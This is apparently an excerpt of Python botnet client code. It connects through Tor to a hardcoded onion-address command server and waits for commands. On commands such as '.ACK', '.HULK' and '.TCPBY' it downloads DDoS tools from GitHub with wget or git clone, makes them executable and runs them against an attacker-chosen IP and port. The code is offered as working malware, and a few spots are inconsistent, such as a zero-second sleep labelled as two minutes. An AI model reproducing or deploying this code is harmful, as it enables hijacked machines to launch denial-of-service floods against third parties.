...
C2_ADDRESS = 'xlpkuivjwr5urxe2aez4xqakpx5gnhxvarv2uealpdlnbevkevaghdyd.onion'
C2_PORT = 8888
TOR_PROXY_ADDRESS = '127.0.0.1'
TOR_PROXY_PORT = 9050  # This is the default port for Tor's SOCKS proxy

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, TOR_PROXY_ADDRESS, TOR_PROXY_PORT)
...
def main():
        # Connect to the Tor onion service
    ...
    while 1:
        try:
            ...
            time.sleep(0) # retry in 2 mins if connection fails
    ...
    while 1:
        try:
            ...
            if command == '.ACK':
                ...
                port = args[2]
                secs = time.time() + int(args[3])
                ack = f"rm -rf ack.*;wget https://github.com/PraneethKarnena/DDoS-Scripts/raw/master/Layer-4/ACK/ack;chmod +x ./ack;./ack {ip} {port} {secs}"
                os.system(ack)
            if command == '.HOME':
                ip = args[1]
                port = args[2]
                size = args[3]
                secs = args[4]
                home = f"rm -rf home.pl.*;wget https://raw.githubusercontent.com/hoaan1995/ZxCDDoS/main/home.pl;perl home.pl {ip} {port} {size} {time}"
                os.system(home)
            if command == '.HULK':
                ip = args[1]
                hulk = f"apt-get install -y git golang-go;sudo git clone https://github.com/grafov/hulk; cd hulk;go run hulk.go -site {ip}"
                os.system(hulk)
            if command == '.TCPBY':
                ip = args[1]
                port = args[2]
                secs = args[3]
                tcp = f"wget https://github.com/oofadcoolzmamn2/lol/blob/main/TCP-BYPASSV2?raw=true;chmod +x ./TCP-BYPASSV2; mv ./TCP-BYPASSV2 ./TCPBY;./TCPBY {ip} {port} {secs}"
                os.system(tcp)
            if command == '.BURSTUDP':
                ip = args[1]
                secs = args[2]
                burst = f'rm -rf UFO-BYPASS.pl;wget https://raw.githubusercontent.com/oofadcoolzmamn2/lol/main/UFO-BYPASS.pl;mv UFO-BYPASS.pl burst.pl;perl burst.pl {ip} {secs} 1'
            if command == 'PING':
                c2.send('PONG'.encode())
